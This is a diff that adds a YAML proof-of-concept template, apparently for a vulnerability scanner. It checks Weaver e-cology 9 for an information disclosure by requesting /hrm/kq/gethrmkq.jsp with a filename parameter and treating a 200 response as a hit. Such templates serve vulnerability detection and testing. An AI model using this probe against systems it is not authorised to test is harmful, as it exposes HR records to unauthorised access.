@@ -1,0 +1,13 @@
+name: poc-yaml-ecology9-hrmlog-information-disclose
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /hrm/kq/gethrmkq.jsp?filename=hrmkq
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
